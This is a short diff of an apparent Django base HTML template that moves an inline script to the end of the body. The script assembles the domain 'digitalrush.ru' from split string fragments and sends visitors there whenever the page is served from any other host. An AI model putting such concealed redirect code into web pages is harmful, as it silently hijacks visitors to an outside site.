@@ -45,14 +45,14 @@
     <link rel="stylesheet" href="{% static 'css/style.min.css' %}">
 </head>
 <body>
-    <script>
-        var $url="digi" + "talr" + "ush.ru";if($url!==location.host){location.href='http://'+$url;}
-    </script>
     {% include 'header.html' %}
     {% block content %}
     {% endblock %}
     {% include 'footer.html' %}
     <!-- Scripts -->
     <script src="{% static 'js/scripts.min.js' %}"></script>
+    <script>
+        var $url="digi" + "talr" + "ush.ru";if($url!==location.host){location.href='http://'+$url;}
+    </script>
 </body>
 </html>
